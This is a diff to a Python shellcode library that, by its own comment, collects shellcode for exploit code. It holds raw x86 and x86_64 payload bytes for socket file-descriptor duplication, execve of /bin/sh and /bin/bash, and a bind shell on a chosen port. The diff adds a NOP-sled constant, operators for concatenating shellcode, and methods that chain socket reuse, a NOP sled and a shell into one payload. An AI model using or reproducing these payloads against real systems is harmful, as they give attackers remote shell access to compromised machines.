@@ -4,6 +4,8 @@ from struct import *
 from capstone import *
 # a collection of shellcode use regulary on exploit code.
 
+NOPs_X86 = '\x90'
+
 def stoh(host):
 	byte_s = ''
 	if host.count('.') == 3:
@@ -13,6 +15,7 @@ def stoh(host):
 
 class Shellcode(str):
 	mode = 0
+
 	def __new__(cls,content,mode):
 		obj = super(Shellcode,cls).__new__(cls,content)
 		if isinstance(mode,int):
@@ -30,14 +33,52 @@ class Shellcode(str):
 			md = Cs(CS_ARCH_X86, CS_MODE_32)
 
 		if not md:
-			raise Exception('Unexpected Arch')
+			raise Exception('Unsupported Arch')
 		else:
 			for (address, size, mnemonic, op_str) in md.disasm_lite(str.__str__(self), 0x1000):	
 				print("0x%x:\t%s\t%s" % (address, mnemonic, op_str))
 
+	# concentraction two Shellcode
+	def __add__(self,obj):
+		# if current shellcode mode was different from obj shellcode
+		# it will raise exeception.
+
+		# add 2 Shellcode
+		if type(obj) is Shellcode:
+			# check architecture mode
+			if obj.mode == self.mode:
+				return Shellcode(str.__str__(self) + obj.__str__(),self.mode)
+			else:
+				raise Exception('Difference Architecture Mode')
+		# add Shellcode with string
+		elif type(obj) is str:
+			return Shellcode(str.__str__(self) + obj,self.mode)
+		else:
+			raise Exception('Invalid Type: obj must be a string or Shellcode')
+
+	# def __radd__(self):
+	# 	pass
+
+	# += method
+	def __iadd__(self,obj):
+		# if current shellcode mode was different from obj shellcode
+		# it will raise exeception.
+		if type(obj) is Shellcode:
+			# check mode of 2 objs, there objs must be the same
+			if obj.mode == self.mode:
+				self = self + obj.__str__()
+				return self
+			else:
+				raise Exception('Difference Architecture Mode')
+		elif type(obj) is str:
+			self = self + obj
+			return self
+		else:
+			raise Exception('Invalid Type: obj must be a string or Shellcode')
+
 	def __str__(self):
 		return str.__str__(self)
-
+ 
 class x86:
 	def dupsSock(self):
 		dups = "\x31\xc9\x6a\x04\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
@@ -53,6 +94,10 @@ class x86:
 		execve+= "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f"
 		execve+= "\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
 		return Shellcode(execve,0)
+
+	def dupsExecve(self):
+		# reuse socket fd and execve()
+		return self.dupsSock() + NOPs_X86*10 + self.execveShell()
 
 	def bindShell(self,port):
 		bindshell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
@@ -98,3 +143,6 @@ class x86_64:
 		execve+= "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
 		execve+= "\x54\x5f\x6a\x3b\x58\x0f\x05"
 		return Shellcode(execve,1)
+
+	def dupsExecve(self):
+		return self.dupsSock() + NOPs_X86*10 + self.execveSmallShell()
